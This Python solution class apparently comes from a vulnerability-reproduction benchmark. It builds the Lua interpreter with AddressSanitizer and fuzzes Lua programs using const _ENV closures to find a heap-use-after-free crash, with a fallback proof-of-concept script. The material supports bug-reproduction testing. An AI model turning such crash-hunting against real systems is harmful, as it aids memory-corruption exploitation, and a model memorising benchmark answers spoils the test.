import os
import tarfile
import tempfile
import subprocess
import random
import time
import shutil


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            return self._solve_impl(src_path)
        except Exception:
            return self._static_poc()

    def _solve_impl(self, src_path: str) -> bytes:
        workdir = tempfile.mkdtemp(prefix="lua_poc_")
        try:
            # Extract tarball
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    tar.extractall(workdir)
            except Exception:
                # If extraction fails, fall back
                return self._static_poc()

            # Find lua.c
            src_dir = self._find_lua_src_dir(workdir)
            if src_dir is None:
                return self._static_poc()

            exe_path = os.path.join(workdir, "my_lua")
            if not os.path.exists(exe_path):
                asan_built = self._build_lua_interpreter(src_dir, exe_path)
                if not os.path.exists(exe_path):
                    return self._static_poc()
            else:
                asan_built = True  # assume if pre-existing, it's usable

            poc_code = self._find_poc_with_interpreter(exe_path, asan_built)
            if poc_code is not None:
                return poc_code.encode("utf-8", "ignore")
            else:
                return self._static_poc()
        finally:
            try:
                shutil.rmtree(workdir, ignore_errors=True)
            except Exception:
                pass

    def _find_lua_src_dir(self, root: str):
        lua_c_dir = None
        for dirpath, dirnames, filenames in os.walk(root):
            if "lua.c" in filenames:
                lua_c_dir = dirpath
                break
        return lua_c_dir

    def _build_lua_interpreter(self, src_dir: str, exe_path: str) -> bool:
        """
        Try to build a Lua interpreter with ASan from the directory containing lua.c.
        Returns True if built with ASan, False otherwise.
        """
        # Collect C files in this directory
        c_files = []
        for entry in os.listdir(src_dir):
            if entry.endswith(".c"):
                c_files.append(os.path.join(src_dir, entry))

        lua_c = None
        lib_files = []
        for f in c_files:
            base = os.path.basename(f)
            if base == "lua.c":
                lua_c = f
            elif base == "luac.c":
                # avoid second main()
                continue
            else:
                lib_files.append(f)

        if lua_c is None:
            return False

        cc = "gcc"
        asan_success = False

        # Try build with ASan first
        try:
            cmd = [
                cc,
                "-fsanitize=address",
                "-g",
                "-O1",
                "-std=c99",
                "-I" + src_dir,
            ]
            cmd.extend(lib_files)
            cmd.append(lua_c)
            cmd.extend(["-o", exe_path, "-lm", "-ldl"])
            subprocess.run(
                cmd,
                cwd=src_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=180,
                check=True,
            )
            asan_success = True
            return True
        except Exception:
            pass

        # Retry without -ldl for environments where it's not needed/available
        if not asan_success:
            try:
                cmd = [
                    cc,
                    "-fsanitize=address",
                    "-g",
                    "-O1",
                    "-std=c99",
                    "-I" + src_dir,
                ]
                cmd.extend(lib_files)
                cmd.append(lua_c)
                cmd.extend(["-o", exe_path, "-lm"])
                subprocess.run(
                    cmd,
                    cwd=src_dir,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=180,
                    check=True,
                )
                asan_success = True
                return True
            except Exception:
                pass

        # Fallback: non-ASan build, may not detect UAF but try anyway
        try:
            cmd = [
                cc,
                "-g",
                "-O2",
                "-std=c99",
                "-I" + src_dir,
            ]
            cmd.extend(lib_files)
            cmd.append(lua_c)
            cmd.extend(["-o", exe_path, "-lm", "-ldl"])
            subprocess.run(
                cmd,
                cwd=src_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=180,
                check=True,
            )
            return False
        except Exception:
            try:
                cmd = [
                    cc,
                    "-g",
                    "-O2",
                    "-std=c99",
                    "-I" + src_dir,
                ]
                cmd.extend(lib_files)
                cmd.append(lua_c)
                cmd.extend(["-o", exe_path, "-lm"])
                subprocess.run(
                    cmd,
                    cwd=src_dir,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=180,
                    check=True,
                )
                return False
            except Exception:
                return False

    def _make_pattern_generators(self):
        def pat1(idx: int, rng: random.Random) -> str:
            # Simple closure defined inside a block with const _ENV
            return f"""
local f_{idx}
do
  local _ENV <const> = {{
    print = print,
    idx = {idx}
  }}
  function f_{idx}()
    print("env idx {idx}", idx)
  end
end

for i_{idx} = 1, 3 do
  f_{idx}()
end
"""

        def pat2(idx: int, rng: random.Random) -> str:
            # Factory that captures const _ENV in returned closure
            return f"""
local function factory_{idx}(v)
  local _ENV <const> = {{
    v = v,
    math = math
  }}
  return function()
    return v, math.sin(v)
  end
end

local list_{idx} = {{}}
for i_{idx} = 1, 5 do
  list_{idx}[i_{idx}] = factory_{idx}(i_{idx})
end

collectgarbage("collect")

for i_{idx} = 1, 5 do
  list_{idx}[i_{idx}]()
end
"""

        def pat3(idx: int, rng: random.Random) -> str:
            # Nested const _ENV blocks with captured upvalues
            return f"""
local g_{idx}

do
  local _ENV <const> = {{
    v_outer_{idx} = "outer_{idx}",
    print = print,
    tostring = tostring
  }}

  function g_{idx}(param)
    local result = {{}}
    do
      local _ENV <const> = {{
        v_inner_{idx} = "inner_{idx}",
        print = print,
        result = result
      }}
      result[#result+1] = v_outer_{idx}
      result[#result+1] = v_inner_{idx}
      print("g_{idx}", param, v_outer_{idx}, v_inner_{idx})
    end
    return result
  end
end

local r_{idx} = g_{idx}({idx})
collectgarbage("collect")
for i = 1, #r_{idx} do
  r_{idx}[i] = tostring(r_{idx}[i])
end
"""

        def pat4(idx: int, rng: random.Random) -> str:
            # Loop that creates many closures each with its own const _ENV
            return f"""
local arr_{idx} = {{}}

for n_{idx} = 1, 4 do
  do
    local _ENV <const> = {{
      n = n_{idx},
      table = table
    }}
    table.insert(arr_{idx}, function()
      return n
    end)
  end
end

collectgarbage("collect")

for i = 1, #arr_{idx} do
  arr_{idx}[i]()
end
"""

        def pat5(idx: int, rng: random.Random) -> str:
            # To-be-closed variable in presence of const _ENV
            return f"""
local function mk_tbc_{idx}()
  local _ENV <const> = {{
    print = print,
    tostring = tostring,
    table = table
  }}
  local log = {{}}
  local res <close> = setmetatable({{}}, {{
    __close = function()
      log[#log+1] = "close_{idx}"
    end
  }})
  function res:add(v)
    print("add_{idx}", v)
    log[#log+1] = tostring(v)
  end
  return res, log
end

local obj_{idx}, log_{idx} = mk_tbc_{idx}()
for i = 1, 3 do
  obj_{idx}:add(i)
end
collectgarbage("collect")
"""

        def pat6(idx: int, rng: random.Random) -> str:
            # Coroutine using const _ENV inside the coroutine body
            return f"""
local function cofunc_{idx}()
  local _ENV <const> = {{
    coroutine = coroutine,
    print = print
  }}
  for i = 1, 3 do
    print("co_{idx}", i)
    coroutine.yield(i)
  end
end

local co_{idx} = coroutine.create(cofunc_{idx})
while true do
  local ok, v = coroutine.resume(co_{idx})
  if not ok or v == nil then break end
end
collectgarbage("collect")
"""

            return code  # pragma: no cover

        return [pat1, pat2, pat3, pat4, pat5, pat6]

    def _gen_random_program(self, rng: random.Random) -> str:
        patterns = self._make_pattern_generators()
        nblocks = rng.randint(1, 4)
        idx_base = rng.randint(1, 10**6)
        segments = ["math.randomseed(1)\n"]
        for j in range(nblocks):
            pat = rng.choice(patterns)
            segments.append(pat(idx_base + j, rng))
        segments.append("collectgarbage('collect')\n")
        return "\n".join(segments)

    def _find_poc_with_interpreter(self, exe_path: str, asan_built: bool) -> str | None:
        """
        Run a series of candidate Lua programs against the built interpreter,
        looking for an AddressSanitizer heap-use-after-free or similar crash.
        """
        env = os.environ.copy()
        if asan_built:
            asan_opts = env.get("ASAN_OPTIONS", "")
            parts = []
            if asan_opts:
                parts.append(asan_opts)
            # Disable leak detection to save time
            parts.append("detect_leaks=0")
            # Do not abort on first error to ensure message is printed
            parts.append("abort_on_error=0")
            env["ASAN_OPTIONS"] = ":".join(parts)

        tmp_script = os.path.join(os.path.dirname(exe_path), "candidate.lua")

        def run_candidate(code: str) -> bool:
            try:
                with open(tmp_script, "w", encoding="utf-8") as f:
                    f.write(code)
            except Exception:
                return False
            try:
                proc = subprocess.run(
                    [exe_path, tmp_script],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                    timeout=5,
                )
            except subprocess.TimeoutExpired:
                return False
            except Exception:
                # Any immediate crash is also interesting
                return False

            out = b""
            if proc.stdout:
                out += proc.stdout
            if proc.stderr:
                out += proc.stderr
            text = out.decode("utf-8", "ignore")

            if "AddressSanitizer" in text or "heap-use-after-free" in text or "heap-use-after" in text:
                return True

            # As a weaker heuristic, if we didn't build with ASan, treat certain crashes as interesting
            if not asan_built and proc.returncode != 0:
                if ("Segmentation fault" in text) or ("segmentation fault" in text):
                    return True
            return False

        # First try a small set of targeted, deterministic programs
        patterns = self._make_pattern_generators()
        fixed_rng = random.Random(12345)
        predefined_programs = []

        # A few deterministic combinations of patterns
        for i in range(6):
            idx = 1000 + i * 10
            code_parts = ["math.randomseed(1)\n"]
            code_parts.append(patterns[i % len(patterns)](idx, fixed_rng))
            code_parts.append(patterns[(i + 1) % len(patterns)](idx + 1, fixed_rng))
            code_parts.append("collectgarbage('collect')\n")
            predefined_programs.append("\n".join(code_parts))

        # Also include one direct, hand-crafted program that heavily uses const _ENV
        manual = """
-- manual candidate focusing on const _ENV and closures
local f_manual

do
  local _ENV <const> = {
    print = print,
    value = "manual",
    tonumber = tonumber,
  }

  function f_manual(x)
    local s = tostring(value)
    if x then
      print(s, x)
    else
      print(s)
    end
  end
end

collectgarbage("collect")

for i = 1, 5 do
  f_manual(i)
end

local function factory_manual(env_tbl, tag)
  local _ENV <const> = env_tbl
  return function()
    return tag, value
  end
end

local funcs_manual = {}
for i = 1, 10 do
  funcs_manual[i] = factory_manual({ value = i }, i)
end

collectgarbage("collect")

for i = 1, 10 do
  local tag, val = funcs_manual[i]()
end
"""
        predefined_programs.insert(0, manual)

        for code in predefined_programs:
            if run_candidate(code):
                return code

        # If none of the predefined ones crash, fuzz around the pattern space
        start_time = time.time()
        time_limit = 25.0  # seconds for fuzzing
        max_programs = 2000
        rng = random.Random(0xBADC0DE)

        for _ in range(max_programs):
            if time.time() - start_time > time_limit:
                break
            code = self._gen_random_program(rng)
            if run_candidate(code):
                return code

        return None

    def _static_poc(self) -> bytes:
        """
        Fallback static PoC candidate using const _ENV and closures.
        """
        code = """
-- fallback PoC candidate targeting const _ENV miscompilation

local f1

do
  local _ENV <const> = {
    print = print,
    value = "fallback"
  }

  function f1()
    print(value)
  end
end

collectgarbage("collect")

for i = 1, 10 do
  f1()
end

local function factory(env_tbl, tag)
  local _ENV <const> = env_tbl
  return function()
    return tag, value
  end
end

local funcs = {}
for i = 1, 20 do
  funcs[i] = factory({ value = i }, i)
end

collectgarbage("collect")

for i = 1, 20 do
  local tag, val = funcs[i]()
end
"""
        return code.encode("utf-8", "ignore")